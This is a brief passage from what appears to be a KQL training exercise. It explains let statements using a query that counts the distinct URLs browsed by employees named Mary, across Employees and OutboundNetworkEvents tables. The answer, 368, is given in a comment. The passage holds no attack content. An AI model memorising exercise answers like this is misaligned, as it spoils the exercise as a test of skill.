1.9

There will be situations where you will want to view items using more than just one table. Let statements allow us to set a variable name equal to an expression or function. In the example below we'll see how we can compare multiple users that share the same name, but combine their results to get exactly what we're looking for.

How many distinct URLs were browsed by employees with the first name Mary?

let A=
Employees
| where name contains "Mary"
| distinct ip_addr;
OutboundNetworkEvents
| where src_ip has_any (A)
| distinct url
///368

